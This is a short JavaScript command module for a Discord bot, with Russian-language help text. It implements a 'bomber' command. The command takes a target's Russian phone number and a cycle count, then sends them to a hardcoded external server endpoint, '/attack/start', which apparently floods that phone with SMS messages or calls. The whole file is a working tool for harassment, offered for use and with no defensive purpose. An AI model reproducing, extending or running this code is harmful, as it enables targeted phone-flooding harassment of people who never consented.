const Discord = module.require("discord.js");
const request = require('request')

module.exports.run = async (bot, message, args) => {
    let bk = require('../botconfig.json');
    if (args) if (args[0] == 'help') return bot.send(`**bomber** - включает бомбер на чей то номер.\n**Использование:** ${bk.prefix}бомбер <номер(пример:800 555 35-35, без +7 в начале.)> <кол-во>`);
    console.log("Была использована команда: bd!bomber (Номер: +7" + args[0] + ")\nПользователь: <@" + message.author.id + ">\n===========================\n");
    request.post('http://178.47.142.246/attack/start', {
            json: {
            phone_code: "7",
            phone: args[0],
            number_of_cycles: args[1]
            }
            }, (error, res, body) => {
            if (error) {
            console.error(error)
            return
            }
            message.channel.send(`Вы включили бомбер на номер ${args[0]}, циклов: ${args[1]}`)
            console.log(`Api вернул код: ${res.statusCode}`)
            message.channel.send(`Api вернул код: ${res.statusCode}`)
            console.log(body)
        })
};
module.exports.help = {
    name: "bomber"
};